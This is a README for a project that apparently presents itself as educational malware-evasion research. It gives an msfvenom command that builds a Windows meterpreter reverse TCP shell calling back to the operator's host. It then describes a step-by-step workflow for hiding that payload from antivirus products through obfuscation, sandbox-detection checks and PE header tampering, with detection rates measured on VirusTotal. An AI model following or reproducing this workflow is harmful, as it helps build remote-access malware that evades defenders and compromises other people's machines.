
# InvisMalware: Advanced Malware Evasion Techniques

## Table of Contents
1. [Introduction](#introduction)
2. [Features](#features)
3. [Installation](#installation)
4. [Usage](#usage)
5. [Experiment Methodology](#experiment-methodology)
6. [Testing](#testing)
7. [Contributing](#contributing)
8. [License](#license)

---

## Introduction
**InvisMalware** is a project designed to demonstrate advanced malware evasion techniques that bypass antivirus detection. This research-driven malware experiment focuses on utilizing obfuscation methods, such as code modifications and anti-sandbox strategies, to evade static and dynamic malware detection.

This project is **for educational purposes** only, intended to provide insights into modern malware defense strategies by learning from the evasion techniques used by malicious actors.

---

## Features
- **Shellcode Generation**: Create custom reverse TCP shell payloads using msfvenom.
- **Code Obfuscation**: Modify malware code to evade antivirus detection by adding NOPs, manipulating PE headers, and more.
- **Anti-Dynamic Analysis**: Include checks to detect sandbox environments such as audio driver and USB device presence.
- **PE Header Manipulation**: Disguise the malware by tweaking the Portable Executable (PE) header to avoid signature-based detection.
- **Evasion Rate Calculation**: Measure the effectiveness of evasion techniques by comparing results across various antivirus engines.

---

## Installation
To get started, clone the repository and install necessary dependencies.

### Prerequisites
- Python 3.x
- VirtualBox/VMware (for testing in virtual environments)
- **Metasploit Framework** (for generating shellcode)
- **PE-bear** (for PE header manipulation)

### Clone the Repository
```bash
git clone https://github.com/mawg0ud/InvisMalware.git
cd InvisMalware
```

### Install Dependencies
```bash
pip install -r requirements.txt
```

---

## Usage

### 1. Generate Malware Shellcode
Use msfvenom to generate reverse TCP shellcode:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f c > evilexp.c
```

### 2. Modify the Shellcode
Edit the `evilexp.c` file to obfuscate the code and avoid detection.

### 3. Run in Virtual Machine
Deploy the malware in a secure, isolated virtual machine to test its behavior and measure detection rates.

### 4. Upload to VirusTotal
Upload your malware to [VirusTotal](https://www.virustotal.com/) to evaluate its evasion rate across multiple antivirus engines.

---

## Experiment Methodology
The project follows a four-stage methodology to achieve malware evasion:
1. **Shellcode Generation**: Create baseline reverse shellcode.
2. **Code Modification**: Obfuscate the shellcode to evade detection.
3. **Anti-Dynamic Analysis**: Add sandbox detection to bypass dynamic analysis tools.
4. **PE Header Modification**: Alter the PE header to further obfuscate the malware signature.

---

## Testing
### Local Testing
Run the malware on your virtual machine equipped with antivirus software such as **Kaspersky**, **Windows Defender**, or **Bitdefender**.

### VirusTotal Testing
Upload the modified malware to **VirusTotal** and check how many antivirus engines successfully detect it.

---

## Contributing
We welcome contributions to improve the project. If you'd like to contribute:
1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Submit a pull request with detailed information about your changes.

---

## License
This project is licensed under the MIT License. See the [LICENSE](LICENSE.txt) file for details.

---
